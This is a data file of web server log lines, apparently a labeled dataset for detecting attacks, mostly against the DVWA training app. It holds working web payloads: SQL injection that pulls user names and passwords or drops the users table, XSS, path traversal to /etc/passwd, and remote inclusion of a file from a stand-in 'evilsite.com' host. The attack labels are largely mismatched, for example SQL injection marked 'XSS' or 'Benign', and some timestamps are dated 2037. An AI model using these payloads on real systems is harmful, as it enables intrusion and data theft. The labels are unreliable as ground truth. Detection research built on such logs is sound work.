220.113.127.59 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/xss_r/?name=%3Cxss+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fxss%3E HTTP/1.1  [-] 200 1488 ,Benign
231.136.203.200 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/xss_r/?name=script HTTP/1.1  [-] 200 1465 ,XSS
67.108.135.103 , [09/Mar/2022:17:00:51 +0800] ,POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1  [txtName=a&mtxMessage=onmouseover%3D%22alert%281%29%22&btnSign=Sign+Guestbook] 200 1763 ,SQL Injection
108.250.78.165 , [09/Mar/2022:17:02:45 +0800] ,POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1  [txtName=test&mtxMessage=%3Conmouseover%3D%22alert%281%29%22%3E&btnSign=Sign+Guestbook] 200 1774 ,Local File Inclusion
19.181.73.65 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2Ccomment%2Ccomment_id%2Cname%29%29%2C0x717a786b71%29%2CNULL%20FROM%20dvwa.guestbook--%20-&Submit=Submit HTTP/1.1  [-] 200 82 ,XSS
161.87.155.87 , [13/Mar/2022:00:51:52 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2Ctable_name%29%29%2C0x717a786b71%29%2CNULL%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%280x64767761%29--%20-&Submit=Submit HTTP/1.1  [-] 200 82 ,XSS
76.186.22.123 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=1%27+SELECT+*+FROM+users%23&Submit=Submit HTTP/1.1   500 295  ,XSS
126.160.178.117 , [12/Mar/2023:08:29:11 -0400] ,GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+*+FROM+users%23&Submit=Submit HTTP/1.1   500 295 ,Benign
189.56.115.126 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2C+password+FROM+users%23&Submit=Submit HTTP/1.1   200 1889 ,XSS
216.41.252.154 , [27/Dec/2037:12:00:00 +0530] ,GET login/?id=%27+or+1=1%23 HTTP/1.1   200 1568  ,SQL Injection
73.185.129.143 , [09/Mar/2022:17:00:55 +0800] ,GET login/?id=%27+or+1=1%23 HTTP/1.1   200 1662  ,SQL Injection
177.5.173.234 , [25/Jun/2020:03:09:12 +0000] ,GET login/?id=27+or+1+%3D+1%3B+--+&Submit=Submit HTTP/1.1   200 1117  ,Benign
24.127.25.211 , [07/Mar/2022:16:15:53 +0800] ,GET login/?id=27+or+1+%3D+1%3B+--+&Submit=Submit HTTP/1.1   200 1229  ,Benign
251.195.134.192 , [22/May/2012:00:16:54 +0000] ,GET login/?id=admin%27+-- HTTP/1.1   200 1048  ,XSS
53.154.17.222 , [13/Mar/2022:00:29:53 +0800] ,GET login/?id=admin%27+-- HTTP/1.1   200 1139  ,XSS
25.149.74.99 , [07/Mar/2022:16:41:41 +0800] ,GET login/?id=SELECT+%2A+FROM+members+WHERE+%271%27%3D%271%27+--&Submit=Submit HTTP/1.1   200 1211  ,XSS
159.76.175.153 , [13/Mar/2022:00:14:02 +0800] ,GET login/?id=SELECT+%2A+FROM+members+WHERE+%271%27%3D%271%27+--&Submit=Submit HTTP/1.1   200 1302  ,Benign
213.168.167.14 , [13/Mar/2022:00:14:02 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=%22%20or%20%22%22%2A%22&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1674  ,XSS
119.13.171.252 , [10/Mar/2023:04:27:28 -0500] ,GET /dvwa/vulnerabilities/sqli/?id=%20WHERE%201%3D1%20AND%201%3D1%23&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1676  ,XSS
226.135.132.208 , [13/Mar/2022:00:04:04 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=%20UNION%20SELECT%20%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1672  ,XSS
111.64.225.233 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%27%20UNION%20SELECT%20sum%28columnname%20%29%20from%20tablename%20--&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1676  ,XSS
105.65.229.3 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=1%27%20GROUP%20BY%201%2C2%2C--%2B&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1676  ,XSS
231.82.90.50 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=1%27%20ORDER%20BY%202--%2B&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1674  ,Benign
80.115.31.27 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=admin%22%20or%20%221%22%3D%221&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1674  ,XSS
118.77.137.250 , [21/Feb/2022:14:43:44 +0800] ,GET /products.php?categoryid=1%20OR%201=1;-- HTTP/1.1   200 1432 ,SQL Injection
43.229.2.75 ,  [27/Dec/2037:12:00:00 +0530] ,GET /search.php?search_query=%27;DROP%20TABLE%20users;-- HTTP/1.1   500 1432 ,XSS
219.97.45.99 , [25/Jun/2020:03:09:12 +0000] ,"GET /profile.php?id=1234%20UNION%20SELECT%20username,password%20FROM%20users;-- HTTP/1.1   200 1203 ",XSS
23.129.201.70 , [21/Feb/2022:14:11:25 +0800] ,GET /articles.php?id=1%20OR%20SLEEP(10);-- HTTP/1.1   200 1203 ,SQL Injection
63.152.131.214 , [16/Mar/2023:03:41:51 -0400] ,GET /search.php?q=foo%27;DROP%20TABLE%20users;%20-- HTTP/1.1    200 1123 ,XSS
151.150.60.10 , [22/May/2012:00:16:54 +0000] ,GET /search.php?q=foo%27%3B%20SELECT%20*%20FROM%20users%3B%20-- HTTP/1.1  200 1123 ,Benign
37.115.39.198 , [27/Dec/2037:12:00:00 +0530] ,GET /usr/login HTTP/1.1  502 4950 ,Benign
190.93.45.35 , [09/Mar/2022:17:05:30 +0800] ,POST /usr/admin/developer HTTP/1.1  502 4955 ,Benign
207.230.69.98 , [10/Mar/2023:05:32:31 -0500] ,GET /usr/admin/developer HTTP/1.1  303 5005 ,XSS
113.68.228.79 , [22/May/2012:00:16:54 +0000] ,POST /usr/login HTTP/1.1  403 4995 ,SQL Injection
234.65.208.188 , [13/Mar/2022:00:04:41 +0800] ,PUT /usr/register HTTP/1.1  200 4980 ,SQL Injection
156.55.85.104 , [09/Mar/2022:17:00:52 +0800] ,GET /usr/register HTTP/1.1  404 4989 ,SQL Injection
206.146.184.146 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd HTTP/1.1  200 2451 ,Benign
57.162.38.175 , [07/Mar/2023:10:44:02 -0500] ,GET /dvwa/vulnerabilities/fi/?page=../../hackable/flags/fi.php HTTP/1.1  200 1586 ,Local File Inclusion
140.56.220.61 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1  200 1657 ,SQL Injection
165.185.27.172 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/view_source.php?id=fi&security=low HTTP/1.1  200 1024 ,SQL Injection
114.132.189.194 , [09/Mar/2022:17:00:51 +0800] ,GET /dvwa/vulnerabilities/view_help.php?id=fi&security=low&locale=en HTTP/1.1  200 1997 ,Local File Inclusion
140.95.4.108 , [09/Mar/2022:17:02:45 +0800] ,GET /dvwa/vulnerabilities/fi?page=http://www.evilsite.com/evil.php HTTP/1.1  301 678 ,SQL Injection
159.119.72.203 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/dvwa/css/source.css HTTP/1.1  200 533 ,Benign
204.79.96.97 , [13/Mar/2022:00:51:52 +0800] ,GET /dvwa/vulnerabilities/fi/?page=http://www.evilsite.com/evil.php HTTP/1.1  200 1375 ,Local File Inclusion
2.33.140.255 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=SELECT+%40%40version&Submit=Submit HTTP/1.1  200 1667 ,Benign
191.213.254.168 , [12/Mar/2023:08:29:11 -0400] ,GET /dvwa/vulnerabilities/sqli/?id=1234+SQL%40%40version&Submit=Submit HTTP/1.1  200 1667 ,XSS
225.2.38.212 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=1%27SELECT+%40%40version&Submit=Submit HTTP/1.1  500 295 ,Benign
69.67.136.64 , [27/Dec/2037:12:00:00 +0530] ,GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users%23&Submit=Submit HTTP/1.1  200 1888 ,XSS
20.80.137.228 , [09/Mar/2022:17:00:55 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=1%27SELECT+%40%40version&Submit=Submit HTTP/1.1  500 295 ,Benign
11.133.86.242 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=1%27SELECT+version+FROM+v%24instance&Submit=Submit HTTP/1.1  500 295 ,XSS
254.8.2.147 ,  [07/Mar/2022:16:15:53 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=1%27UNION+SELECT+%40%40version&Submit=Submit HTTP/1.1  500 295 ,XSS
205.216.156.251 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=1%27SELECT+*+FROM+information_schema.tables&Submit=Submit HTTP/1.1  500 295 ,SQL Injection
3.84.177.201 , [13/Mar/2022:00:29:53 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=1%27UNION+SELECT+*+FROM+information_schema.tables&Submit=Submit HTTP/1.1  500 295 ,XSS
250.192.99.47 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%24getid+%3D+%22SELECT+first_name%2C+last_name+FROM+users+WHERE+user_id+%3D+%27%24id%27%22%3B&Submit=Submit HTTP/1.1  500 295 ,Benign
255.138.9.103 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%25%27+or+%270%27%3D%270&Submit=Submit HTTP/1.1  200 1751 ,Local File Inclusion
4.9.77.17 ,  [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+version%28%29+%23&Submit=Submit HTTP/1.1  200 1798 ,Benign
237.19.9.40 ,  [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+table_name+from+information_schema.tables+%23&Submit=Submit HTTP/1.1  200 2428 ,Local File Inclusion
64.19.186.41 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%25%27+and+1%3D-0+union+select+null%2C+table_name+from+information_schema.tables+where+table_name+like%27user%25%27+%23&Submit=Submit HTTP/1.1  200 1797 ,Benign
210.169.75.0 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28table_name%2C0x0a%2Ccolumn-name%29+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit HTTP/1.1  500 295 ,Benign
254.140.45.91 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28first_name%2C0x0a%2Clast_name%2C0x0a%2Cuser%2C0x0a%2Cpassword%29+from+users+%23&Submit=Submit HTTP/1.1  200 1945 ,XSS
210.81.40.187 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+1%2C%40%40version%23&Submit=Submit HTTP/1.1  200 1727 ,Benign
182.38.251.218 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2C%40%40hostname+%23&Submit=Submit HTTP/1.1  200 1715 ,Benign
232.3.116.67 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%27+order+by+1+%23&Submit=Submit HTTP/1.1  200 1667 ,SQL Injection
64.65.224.2 ,  [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+system_user%28%29%2Cuser%28%29+%23&Submit=Submit HTTP/1.1  200 1721 ,Benign
149.28.227.169 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2Cdatabase%28%29+%23&Submit=Submit HTTP/1.1  200 1714 ,Benign
100.165.47.222 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2Cschema_name+from+information_schema.schemata+%23&Submit=Submit HTTP/1.1  200 1741 ,Benign
240.65.162.235 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2Ctable_name+from+information_schema.tables+%23&Submit=Submit HTTP/1.1  200 2399 ,Benign
88.128.176.245 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2C%40%40datadir+%23&Submit=Submit HTTP/1.1  200 1721 ,Benign
